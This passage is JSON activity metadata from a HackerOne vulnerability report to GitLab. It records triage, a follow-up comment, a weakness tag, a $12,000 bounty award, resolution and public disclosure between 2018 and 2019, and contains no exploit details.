regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-18T18:06:46.349Z","updated_at":"2018-09-18T18:06:46.349Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3354764,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-18T18:06:56.681Z","updated_at":"2018-09-18T18:06:56.681Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3653467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi James,\n\nIt has been two months and I notice this was fixed back in Oct, is there anything stopping this from getting resolved?\n\nCheers,\nRon","markdown_message":"\u003cp\u003eHi James,\u003c/p\u003e\n\n\u003cp\u003eIt has been two months and I notice this was fixed back in Oct, is there anything stopping this from getting resolved?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nRon\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-15T22:11:02.341Z","updated_at":"2018-11-15T22:11:02.341Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4112034,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-07T21:48:40.212Z","updated_at":"2019-02-07T21:48:40.212Z","additional_data":{"added_weaknesses":[{"id":107,"name":"Improper Input Validation"}],"removed_weaknesses":[]},"actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4189028,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-21T22:11:57.898Z","updated_at":"2019-02-21T22:11:57.898Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"12000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ngalog","url":"/ngalog"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4189029,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@ngalog ,\n\nApologies for the delay. Thanks again for reporting this one!\n\nBest regards,\nJames","markdown_message":"\u003cp\u003e\u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eApologies for the delay. Thanks again for reporting this one!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJames\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-21T22:12:39.832Z","updated_at":"2019-02-21T22:12:39.832Z","actor":{"username":"jritchey","cleared":false,"url":"/jritchey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ngalog","url":"/ngalog"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4296493,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-11T04:33:41.898Z","updated_at":"2019-03-11T04:33:41.898Z","first_to_agree":true,"actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4525862,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-10T04:33:42.278Z","updated_at":"2019-04-10T04:33:42.278Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}